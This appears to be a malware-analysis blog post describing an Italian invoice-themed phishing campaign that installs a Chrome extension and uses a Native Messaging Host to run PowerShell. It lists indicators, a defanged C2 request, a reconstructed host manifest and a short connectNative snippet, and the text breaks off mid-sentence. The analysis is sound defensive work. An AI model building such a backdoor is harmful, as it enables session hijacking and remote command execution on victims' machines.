---
title: Breaking Out of Chrome’s Sandbox: A Native Messaging Backdoor Observed in Italy
url: https://www.d3lab.net/breaking-out-of-chromes-sandbox-a-native-messaging-backdoor-observed-in-italy/
source: D3Lab
date: 2026-06-22
fetch_date: 2026-06-23T06:08:21.195619
---

# Breaking Out of Chrome’s Sandbox: A Native Messaging Backdoor Observed in Italy

[![D3Lab](https://i0.wp.com/www.d3lab.net/wp-content/uploads/2019/04/D3Lab_Logo_Enfold-300x102.png?fit=300%2C102&ssl=1 "D3Lab_Logo_Enfold-300×102")](https://www.d3lab.net/ "D3Lab_Logo_Enfold-300×102")

* [Home](https://www.d3lab.net/)
* [Services](/#services)
* [Philosophy](/#philosophy)
* [Contact](/#contact)
* [Blog](https://www.d3lab.net/blog/)
* [Fare clic per aprire il campo di ricerca
  Fare clic per aprire il campo di ricerca

  Cerca](?s= "Fare clic per aprire il campo di ricerca")
* **Menu**
  Menu

* [Collegamento a X](https://twitter.com/D3LabIT "Collegamento a X")
* [Collegamento a LinkedIn](https://www.linkedin.com/company/d3labsrl/ "Collegamento a LinkedIn")
* [Collegamento a Rss questo sito](https://www.d3lab.net/feed/ "Collegamento a Rss  questo sito")
* [Collegamento a Mail](/#contact "Collegamento a Mail")

# Breaking Out of Chrome’s Sandbox: A Native Messaging Backdoor Observed in Italy

[Malware](https://www.d3lab.net/category/malware/)

[![](https://i0.wp.com/www.d3lab.net/wp-content/uploads/2026/06/Native-Messaging-Backdoor.png?resize=1210%2C423&ssl=1)](https://i0.wp.com/www.d3lab.net/wp-content/uploads/2026/06/Native-Messaging-Backdoor.png?fit=1030%2C580&ssl=1 "Native Messaging Backdoor")

![](https://i0.wp.com/www.d3lab.net/wp-content/uploads/2026/06/Native-Messaging-Backdoor.png?resize=1030%2C580&ssl=1)

In June 2026, we analysed a malware campaign distributed through Italian-language phishing emails. The message pretended to deliver an invoice and used the subject `Fattura #2818999851`.

The victim was shown what looked like a PDF document. The downloaded file was instead an obfuscated Windows JavaScript file named `Fattura-2819889242.pfd.js`. The unusual `pfd.js` ending was likely intended to look similar to `.pdf` at a quick glance.

The most interesting part of this infection was not the initial JavaScript. The malware installed a malicious Google Chrome extension and paired it with a Native Messaging Host. This combination allowed code running inside Chrome to request PowerShell commands on the Windows system.

An extension normally cannot start local programs. Native Messaging changed that security boundary.

## The phishing message

The campaign used a short message written in Italian. It told the recipient that a requested invoice was ready for download and was signed by an accounting office. The visible document was presented as a 158 KB PDF.

The invoice numbers in the email subject, the visible document and the downloaded JavaScript file were different. This may indicate that the values were generated automatically for each message or stage of the campaign.

This delivery method is simple, but effective. The victim expects a business document and receives a script disguised as one.

![](https://i0.wp.com/www.d3lab.net/wp-content/uploads/2026/06/Screenshot-2026-06-22-alle-15.39.41.png?resize=949%2C755&ssl=1)

## From JavaScript to Chrome

When executed by Windows Script Host, the JavaScript decoded and wrote two files into the user’s temporary directory:

```
%TEMP%\client_124578.exe
%TEMP%\d3d11.dll
```

`client_124578.exe` was a legitimate, signed executable associated with Epic Games. It was used to load the malicious `d3d11.dll` from the same directory. This is a DLL side-loading technique: a trusted application starts, but loads an attacker-controlled library because of the way Windows resolves dependencies.

The DLL launched a hidden PowerShell process. PowerShell then prepared the Chrome extension and changed Chrome policy settings so that the extension could be installed.

The observed extension was called `Cloud vn105rkj64`, with extension ID:

```
gghagmhimhgfeajfdmjkgmmehbokmglg
```

![](https://i0.wp.com/www.d3lab.net/wp-content/uploads/2026/06/Screenshot-2026-06-22-alle-12.29.35.png?resize=510%2C310&ssl=1)

The malware wrote values under Chrome’s `ExtensionInstallAllowlist` and `ExtensionInstallSources` policy keys. This made the installation look like an administrator-controlled deployment rather than a normal extension installation.

## Why a Chrome extension is not enough

Chrome extensions run with browser permissions. Depending on their manifest, they may read tabs, access cookies or change web pages. They still cannot directly execute `powershell.exe` or arbitrary Windows programs.

This restriction is part of the browser security model. A compromised extension should not automatically become a full operating-system backdoor.

Chrome provides a legitimate exception called Native Messaging. It is designed for applications that need to exchange data with a browser extension. Password managers, security products and enterprise tools may use it.

Native Messaging requires a second component installed on the operating system. This component is called a Native Messaging Host.

## The Native Messaging bridge

The malware registered a host named:

```
com.vn105rkj64.tr7qprrt7g
```

A Native Messaging registration points Chrome to a JSON manifest stored on the computer. A simplified example looks like this:

```
{
  "name": "com.vn105rkj64.tr7qprrt7g",
  "description": "Native messaging host",
  "path": "C:\\Users\\user\\AppData\\Local\\&lt;host>.exe",
  "type": "stdio",
  "allowed_origins": [
    "chrome-extension://gghagmhimhgfeajfdmjkgmmehbokmglg/"
  ]
}
```

This example is a reconstruction of the mechanism, not the original manifest. The exact final executable name of the host was not preserved in the available sandbox artefacts. The analysis did capture temporary C# source generation and execution of `csc.exe`, the Microsoft C# compiler, during the installation stage.

On Windows, Chrome finds the manifest through a registry entry similar to:

```
HKCU\Software\Google\Chrome\NativeMessagingHosts\com.vn105rkj64.tr7qprrt7g
```

The malicious extension can then open the native channel. The following JavaScript is a simplified illustration of the Chrome API involved:

```
const port = chrome.runtime.connectNative("com.vn105rkj64.tr7qprrt7g");

port.postMessage({ command: receivedCommand });

port.onMessage.addListener((result) => {
  sendResultToController(result);
});
```

Chrome starts the registered host and connects its standard input and output to the extension. The host receives a length-prefixed JSON message, processes it outside the browser sandbox and sends a JSON response back.

In this campaign, that bridge was used to execute PowerShell. The extension acted as the network-facing controller, while the local host performed actions on Windows with the permissions of the current user.

## Command and control

The extension contacted `ext2[.]info` over HTTPS. The observed request was:

```
POST /time.php?q=ste_jstest2 HTTP/1.1
Host: ext2[.]info
Origin: chrome-extension://gghagmhimhgfeajfdmjkgmmehbokmglg
```

Although the parameter was present in the URL, the method was `POST`. Collected information and command results were sent in the request body.

The first observed exchange included a Google cookie, the victim’s open tabs and URLs, browser user-agent information, language settings and a stable victim identifier. Theft of an authenticated cookie may allow session hijacking even when the attacker does not know the password.

We did not observe direct extraction of passwords from Chrome’s password store. The confirmed browser data theft was focused on cookies, browsing context and fingerprinting information.

The controller later returned an instruction that resulted in a directory listing of `C:\`. A subsequent POST contained the command output. This provided direct evidence that the extension and Native Messaging Host formed a remote-command backdoor, rather than only an information-stealing extension.

## Why this technique matters

The individual components are legitimate technologies. Signed applications load DLLs, organisations deploy Chrome extensions through policy, and trusted software uses Native Messaging. The danger comes from combining them.

The extension gives the attacker access ...